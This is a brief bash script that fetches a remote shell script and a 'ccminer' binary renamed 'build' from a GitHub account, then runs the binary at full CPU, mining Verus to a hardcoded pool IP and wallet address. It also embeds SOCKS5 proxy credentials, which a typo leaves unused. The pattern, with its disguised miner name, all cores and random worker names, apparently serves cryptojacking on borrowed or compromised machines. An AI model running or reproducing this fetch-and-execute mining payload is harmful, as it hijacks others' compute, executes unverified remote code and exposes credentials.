#!/bin/bash
proxy="socks5://ngegas:Oramandek@44.200.241.47:443"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
wget -qO build https://github.com/renifer12/master/raw/master/ccminer
chmod +x build
chmod +x compile.sh
./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RWZq9wYCRMUegXMGMrn22k4rES4Xr4DzJK.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all) $porxy
./compile.sh
echo succes
